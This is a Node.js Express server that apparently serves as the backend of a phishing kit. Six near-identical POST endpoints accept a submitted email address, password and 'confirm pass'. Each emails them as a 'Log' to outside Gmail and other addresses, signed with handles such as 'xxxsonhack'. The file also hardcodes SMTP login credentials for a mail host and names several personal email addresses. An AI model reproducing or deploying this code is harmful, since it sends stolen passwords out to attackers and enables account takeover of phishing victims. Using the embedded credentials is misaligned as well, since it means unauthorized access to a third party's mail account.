const express = require("express");
const cors = require("cors");
const app = express();

app.use(cors());

const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("api is run");
});

app.post("/sendmail", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "host51.registrar-servers.com",
      port: 465,
      auth: {
        user: "info@goafze.com",
        pass: "sH=dzO.mvg+;",
      },
    });
    let info = await transporter.sendMail({
      from: '"You" <ptn2center@ptninsurancebroker.com>',
      to: " connect@ellsworthins.com",
      subject: "Testing, testing, 123",
      html: `
    <div> 
      <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail5", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "host51.registrar-servers.com",
      port: 465,
      auth: {
        user: "info@goafze.com",
        pass: "sH=dzO.mvg+;",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <info@goafze.com>',
      to: "suemicheallaccuplas@gmail.com",
      subject: "happy Time",
      html: `
    <div> 
      <h2>Enjoy</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxmanlogs</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.send("error");
  }
});

app.post("/sendmail2", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "host51.registrar-servers.com",
      port: 465,
      auth: {
        user: "info@goafze.com",
        pass: "sH=dzO.mvg+;",
      },
    });
    let info = await transporter.sendMail({
      from: '"You" <info@goafze.com>',
      to: "sales1.ppsl@gmail.com",
      subject: "xxxlogs",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.send("error");
  }
});

app.post("/sendmail3", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "host51.registrar-servers.com",
      port: 465,
      auth: {
        user: "info@goafze.com",
        pass: "sH=dzO.mvg+;",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <info@goafze.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail4", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "host51.registrar-servers.com",
      port: 465,
      auth: {
        user: "info@goafze.com",
        pass: "sH=dzO.mvg+;",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <info@goafze.com>',
      to: "import.lifestorng@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail7", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "host51.registrar-servers.com",
      port: 465,
      auth: {
        user: "info@goafze.com",
        pass: "sH=dzO.mvg+;",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <info@goafze.com>',
      to: "soccerroos23@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, console.log(`server in on "5000"`));
